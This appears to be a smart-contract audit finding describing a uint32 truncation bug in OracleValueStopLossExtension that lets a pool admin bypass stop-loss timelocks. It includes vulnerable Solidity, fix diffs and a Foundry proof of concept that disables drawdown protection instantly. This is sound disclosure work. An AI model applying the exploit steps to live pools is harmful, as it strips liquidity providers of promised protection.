### Title
`OracleValueStopLossExtension._afterTimelock` uint32 Truncation Lets Pool Admin Bypass Stop-Loss Timelocks Immediately — (`metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol`)

---

### Summary

`_afterTimelock` casts a `uint256` sum to `uint32` without overflow protection. A pool admin who sets `timelock = type(uint32).max` causes every subsequent `_afterTimelock` call to return a timestamp in the past, making all pending stop-loss proposals (drawdown, decay, watermarks) immediately executable with no delay.

---

### Finding Description

`_afterTimelock` computes the execution deadline for every timelocked stop-loss proposal:

```solidity
function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
}
```

`block.timestamp` is `uint256`; `timelock` is `uint32`. The `uint256` addition never reverts, but the silent `uint32(...)` cast truncates the result when the sum exceeds `type(uint32).max ≈ 4.29 × 10⁹`.

At the current epoch (`block.timestamp ≈ 1.75 × 10⁹`):

```
block.timestamp + type(uint32).max
  ≈ 1.75e9 + 4.29e9 = 6.04e9
uint32(6.04e9) = 6.04e9 - 4.29e9 ≈ 1.75e9 - 1   ← one second in the past
```

`_requireElapsed` then compares:

```solidity
function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert ...;
}
```

`block.timestamp (uint256) < executeAfter (uint32 → uint256 ≈ block.timestamp - 1)` is **false**, so no revert. Every proposal whose `executeAfter` was computed with `timelock = type(uint32).max` is immediately executable.

`proposeOracleStopLossTimelock` imposes **no cap** on `newTimelock`:

```solidity
function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock)
    external onlyPoolAdmin(pool_)
{
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);   // uses CURRENT timelock
    sched.pendingTimelock = newTimelock;            // stores type(uint32).max
    sched.pendingTimelockExecuteAfter = executeAfter;
    ...
}
```

The proposal to set `timelock = type(uint32).max` is itself gated by the **current** timelock (which may be 0 at pool creation or any finite value the admin has already waited through). Once executed, every subsequent `_afterTimelock` call wraps and returns a past timestamp.

---

### Impact Explanation

After the admin installs `timelock = type(uint32).max`, they can:

1. Call `proposeOracleStopLossDrawdown(pool, 1_000_000)` — sets drawdown to 100 % (stop-loss never fires).
2. Immediately call `executeOracleStopLossDrawdown(pool)` — no wait required.

LPs who deposited expecting the stop-loss to cap their drawdown lose that protection instantly, with no on-chain delay for them to react. The admin can also immediately raise watermarks to block legitimate swaps, or zero out decay to freeze watermarks permanently.

This is a direct admin-boundary break: the pool admin exceeds the timelock cap that is the only constraint on their power over stop-loss parameters.

---

### Likelihood Explanation

Medium. The admin must be malicious and must have already waited through the initial timelock once (to set `timelock = type(uint32).max`). Pools initialized with `timelock = 0` are immediately vulnerable without any waiting. Pools with a non-zero initial timelock require one patience period before the overflow is armed.

---

### Recommendation

Add a maximum cap on `newTimelock` in `proposeOracleStopLossTimelock`, or use `uint256` for `executeAfter` throughout and only cast at storage write time with an explicit overflow guard:

```diff
function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock)
    external onlyPoolAdmin(pool_)
{
+   if (newTimelock > MAX_TIMELOCK) revert OracleStopLossTimelockTooLarge(newTimelock);
    ...
}
```

Or fix `_afterTimelock` to revert on overflow:

```diff
function _afterTimelock(address pool_) private view returns (uint32) {
-   return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
+   uint256 result = block.timestamp + oracleStopLossConfig[pool_].timelock;
+   if (result > type(uint32).max) revert TimelockOverflow();
+   return uint32(result);
}
```

### Proof of Concept

```solidity
// Pool initialized with timelock = 1 day
// Step 1: admin waits 1 day, then arms the overflow
vm.prank(admin);
extension.proposeOracleStopLossTimelock(pool, type(uint32).max);
vm.warp(block.timestamp + 1 days);
vm.prank(admin);
extension.executeOracleStopLossTimelock(pool);
// timelock is now type(uint32).max

// Step 2: propose drawdown = 100% (no stop-loss protection)
vm.prank(admin);
extension.proposeOracleStopLossDrawdown(pool, 1_000_000); // E6 = 100%
// _afterTimelock returns uint32(block.timestamp + type(uint32).max)
//   ≈ block.timestamp - 1  (past timestamp, overflow)

// Step 3: execute immediately — no warp needed
vm.prank(admin);
extension.executeOracleStopLossDrawdown(pool); // succeeds instantly
// Stop-loss is now permanently disabled for LPs
